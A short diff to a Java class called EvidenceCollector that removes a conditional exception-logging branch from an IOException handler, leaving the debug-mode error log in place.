@@ -160,10 +160,6 @@ public class EvidenceCollector {
 
 			fos.close();
 		} catch (final IOException e) {
-			if (Cfg.EXCEPTION) {
-				Check.log(e);
-			}
-
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Error: " + e.toString());//$NON-NLS-1$
 			}
